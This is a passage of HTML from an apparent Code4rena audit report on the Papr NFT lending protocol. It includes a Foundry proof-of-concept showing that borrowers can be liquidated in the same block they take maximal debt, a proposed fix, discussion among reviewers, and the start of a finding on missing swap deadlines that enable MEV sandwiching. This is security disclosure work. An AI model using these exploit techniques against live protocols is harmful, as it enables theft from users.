before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The protocol allows users to take debt up to the maximal debt, including it (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471\">PaprController.sol#L471</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newDebt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ExceedsMaxDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newDebt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, a position becomes liquidable as soon as user’s debt reaches user’s maximal debt (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317\">PaprController.sol#L317</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">info</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">_maxDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oraclePrice</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">info</span><span class=\"mtk1\">.</span><span class=\"mtk12\">count</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cachedTarget</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk11\">NotLiquidatable</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Moreover, the same maximal debt calculation is used during borrowing and liquidating, with the same maximal LTV (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556-L559\">PaprController.sol#L556-L559</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_maxDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalCollateraValue</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cachedTarget</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxLoanUnderlying</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalCollateraValue</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">maxLTV</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxLoanUnderlying</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">cachedTarget</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Even though different price kinds are used during borrowing and liquidations (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L467\">LOWER during borrowing</a>, <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L316\">TWAP during liquidations</a>), the price can in fact match (<a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/ReservoirOracleUnderwriter.sol#L11\">ReservoirOracleUnderwriter.sol#L11</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev LOWER is the minimum of SPOT and TWAP</span></span></span></code></pre>\n<p>Which means that the difference in prices doesn’t always create a gap in maximal and liquidation LTVs.</p>\n<p>The combination of these factors allows users to take maximal debts and be liquidated immediately, in the same block. Since liquidations are not beneficial for lending protocols, such heavy penalizing of users may harm the protocol and increase total uncovered debt, and potentially lead to a high bad debt.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// test/paprController/IncreaseDebt.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemoveCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testIncreaseDebtAndBeLiquidated_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Collateral</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">c</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Collateral</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">c</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Calculating the max debt for the borrower.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">maxDebt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">oraclePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Taking the maximal debt.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IncreaseDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxDebt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxDebt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Making a TWAP price that&#39;s identical to the LOWER one.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">priceKind</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PriceKind</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TWAP</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">OracleInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">twapOracleInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getOracleInfoForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The borrower is liquidated in the same block.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectEmit</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemoveCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startLiquidationAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">twapOracleInfo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider adding a liquidation LTV that’s bigger than the maximal borrow LTV; positions can only be liquidated after reaching the liquidation LTV. This will create a room for price fluctuations and let users increase their collateral or decrease debt before being liquidating.</p>\n<p>Alternatively, consider liquidating positions only after their debt has increased the maximal one:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PaprController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PaprController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -314,7 +314,7 @@ contract PaprController is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 oraclePrice =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             underwritePriceForCollateral(collateral.addr, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (info.debt &lt; _maxDebt(oraclePrice * info.count, cachedTarget)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (info.debt &lt;= _maxDebt(oraclePrice * info.count, cachedTarget)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             revert IPaprController.NotLiquidatable();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1369912705\">wilsoncusack (Backed) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I agree we should change this to a <code>&#x3C;</code> <a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L471\">PaprController.sol#L471</a>. But I do not see this as High severity, I don’t think.</p>\n<p>Even with that changed, it is possible to be liquidated in the same block due to Target changing or a new oracle price. I think this is the norm for other lending protocols, e.g. I believe with Compound or Maker you could be liquidated in the same block if you max borrow and the oracle price is updated in the same block?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1370385098\">Jeiwan (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Other lending protocols, like Compound, Maker, and Aave, have different LTV thresholds. For example, <a href=\"https://app.aave.com/reserve-overview/?underlyingAsset=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2&#x26;marketName=proto_mainnet\">AAVE</a></p>\n<p>Max LTV is the maximal debt and Liquidation threshold is the liquidation LTV. Users may borrow until max LTV but they’re liquidated only after reaching the liquidation LTV. In the case of ETH, max LTV on AAVE is 82.50% and Liquidation threshold is 86.00%. The difference allows price and collateral value fluctuations, and it depends on the risk profile of an asset. For example, it’s 13% for <a href=\"https://app.aave.com/reserve-overview/?underlyingAsset=0x514910771af9ca656af840dff83e8264ecf986ca&#x26;marketName=proto_mainnet\">LINK</a></p>\n<p>This difference protects users from liquidations caused by high volatility.</p>\n<p>This is a high finding because users lose funds during liquidations and every liquidation may create bad debt for the protocol. Liquidations are harmful for both protocols and users, so lending protocols shouldn’t allow users to borrow themselves right into liquidations.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1370387712\">wilsoncusack (Backed) commented</a>:</strong></p>\n<blockquote>\n<p>Thanks! TIL. My main reference was squeeth and there you can borrow right up to max (unless I miss something, again). Will consider making this change! </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/190#issuecomment-1370836207\">trust1995 (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Because warden has demonstrated there is potentially no gap between liquidation LTV and borrow LTV, will treat this as HIGH impact. If the gap was even 1 wei I believe it would be a MEDIUM find, but the current code incentivizes MEV bots liquidating max debt positions in the same block.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-8\" style=\"position:relative;\"><a href=\"#medium-risk-findings-8\" aria-label=\"medium risk findings 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (8)</h1>\n<h2 id=\"m-01-missing-deadline-checks-allow-pending-transactions-to-be-maliciously-executed\" style=\"position:relative;\"><a href=\"#m-01-missing-deadline-checks-allow-pending-transactions-to-be-maliciously-executed\" aria-label=\"m 01 missing deadline checks allow pending transactions to be maliciously executed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/64\">[M-01] Missing deadline checks allow pending transactions to be maliciously executed</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/64\">Bobface</a></em></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L208</a></p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L182\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L182</a></p>\n<h3 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h3>\n<p>The <code>PaprController</code> contract does not allow users to submit a deadline for their actions which execute swaps on Uniswap V3. This missing feature enables pending transactions to be maliciously executed at a later point.</p>\n<h3 id=\"detailed-description\" style=\"position:relative;\"><a href=\"#detailed-description\" aria-label=\"detailed description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Detailed description</h3>\n<p>AMMs provide their users with an option to limit the execution of their pending actions, such as swaps or adding and removing liquidity. The most common solution is to include a deadline timestamp as a parameter (for example see <a href=\"https://github.com/Uniswap/v2-periphery/blob/0335e8f7e1bd1e8d8329fd300aea2ef2f36dd19f/contracts/UniswapV2Router02.sol#L229\">Uniswap V2</a> and <a href=\"https://github.com/Uniswap/v3-periphery/blob/6cce88e63e176af1ddb6cc56e029110289622317/contracts/SwapRouter.sol#L119\">Uniswap V3</a>). If such an option is not present, users can unknowingly perform bad trades:</p>\n<ol>\n<li>Alice wants to swap 100 <code>tokens</code> for 1 <code>ETH</code> and later sell the 1 <code>ETH</code> for 1000 <code>DAI</code>.</li>\n<li>The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.</li>\n<li>When the average gas fee dropped far enough for Alice’s transaction to become interesting again for miners to include it, her swap will be executed. In the meantime, the price of <code>ETH</code> could have drastically changed. She will still get 1 <code>ETH</code> but the <code>DAI</code> value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.</li>\n</ol>\n<p>An even worse way this issue can be maliciously exploited is through MEV:</p>\n<ol>\n<li>The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of <code>tokens</code> has gone up significantly since the transaction was signed, meaning Alice would receive a lot more <code>ETH</code> when the swap is executed. But that also means that her maximum slippage value (<code>sqrtPriceLimitX96</code> and <code>minOut</code> in terms of the Papr contracts) is outdated and would allow for significant slippage.</li>\n<li>A MEV bot detects the pending transaction. Since the outdated maximum slippage value now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.</li>\n</ol>\n<p>Since Papr directly builds on Uniswap V3, such deadline parameters should also be offered to the Papr users when transactions involve performing swaps. However, there is no deadline parameter available. Some functions, such as <code>_increaseDebtAndSell</code>, are to some degree protected due to the oracle signatures becoming outdated after 20 minutes, though even that could be too long for certain trades. Other functions, such as <code>buyAndReduceDebt</code>, are entirely unprotected.</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Introduce a <code>deadline</code> parameter to all functions which potentially perform a swap on the user’s behalf.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Categorizing this issue into Medium versus High was not immediately obvious. I came to the conclusion that this is a high-severity issue for the following reason:</p>\n<p>I run an arbitrage MEV bot myself, which also tracks pending transactions in the mempool, though for another reason than the one mentioned in this report. There is a <em>significant</em> amount of pending and even dropped transactions: over <code>200,000</code> transactions that are older than one month. These transactions do all kinds of things, from withdrawing from staking contracts to sending funds to CEXs and also performing swaps on DEXs like Uniswap. This goes to show that this issue will in fact be very real, there will be very old pending transactions wanting to perform trades without a doubt. And with the prevalence of advanced MEV bots, these transactions will be exploited as described in the second example above, leading to losses for Papr’s users.</p>\n<h3 